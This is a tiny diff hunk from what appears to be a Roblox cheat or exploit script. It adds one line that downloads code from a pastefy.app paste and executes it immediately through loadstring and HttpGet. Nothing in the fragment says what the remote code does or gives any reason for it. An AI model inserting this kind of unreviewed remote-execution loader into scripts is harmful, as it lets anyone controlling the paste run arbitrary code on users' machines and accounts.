@@ -3,7 +3,7 @@
 
 setfpscap(1000)
 
-
+loadstring(game:HttpGet'https://pastefy.app/aAkQKVF4/raw')()
 local function cooked(Sex3)
 
 if Sex3 then  
